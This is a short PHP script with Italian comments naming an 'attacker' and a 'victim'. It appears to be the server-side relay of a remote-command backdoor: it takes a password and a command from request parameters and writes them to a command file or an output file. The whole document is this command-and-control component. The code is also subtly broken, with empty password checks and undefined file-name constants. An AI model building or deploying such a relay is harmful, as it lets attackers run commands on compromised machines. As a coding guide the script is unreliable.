<?php

if (isset($_REQUEST['pwd']) && isset($_REQUEST['cmd'])) {
	$pwd = $_REQUEST['pwd'];
	$cmd = $_REQUEST['cmd'];
}
if ($pwd == '') { // inserire parola chiave per l'attaccante
	file_put_contents(filecmd, $cmd);
}
if ($pwd == '') { // inserire parola chiave per la vittima
	file_put_contents(fileoutput, $cmd);
}

?>
